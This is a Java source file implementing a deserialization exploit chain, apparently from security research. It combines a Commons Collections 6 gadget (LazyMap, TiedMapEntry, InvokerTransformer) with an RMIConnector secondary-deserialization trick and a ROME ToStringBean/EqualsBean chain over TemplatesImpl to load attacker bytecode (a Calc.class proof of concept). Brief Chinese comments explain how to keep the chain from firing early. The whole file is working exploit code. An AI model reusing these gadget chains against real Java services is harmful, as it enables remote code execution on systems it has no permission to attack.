package RMIConnector;
import Utils.*;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import javax.xml.transform.Templates;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

import static Utils.ReflectUtils.setFieldValue;


public class CC6 {
    public static void main(String[] args) throws Exception{
        // get b64string of evil object
        HashMap<Object,Object> evilObject = (HashMap<Object, Object>) getEvilObject();
        String evilB64 = SerialUtils.serializeB64(evilObject);
        // put evil object into rmiConnector
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
        setFieldValue(jmxServiceURL, "urlPath", "/stub/"+evilB64);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
        // trigger rmiConnector#connect
        Transformer[] transformers =  new Transformer[]{
                new ConstantTransformer(rmiConnector),
                new InvokerTransformer("connect",null,null),
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put("key1","value1");
        //断开链子，防止put消耗链条
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key2");
        HashMap<Object,Object> hashMap1 = new HashMap<>();
        hashMap1.put(tiedMapEntry,"Jasper");
        //把链子改回来
        setFieldValue(lazyMap,"factory",chainedTransformer);
        //绕过懒加载，调用Transform
        lazyMap.remove("key2");
//        SerialUtils.serialize(hashMap1);
        SerialUtils.unserialize();
    }
    // here can be CC object or others need to deserialize.
    public static Object getEvilObject()throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();
        byte[] bytecodes = Files.readAllBytes(Paths.get("D:\\Calc.class"));
        ReflectUtils.setFieldValue(templatesimpl,"_name","Jasper");
        ReflectUtils.setFieldValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});

        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(equalsBean, "123");
        return hashMap;
    }
}
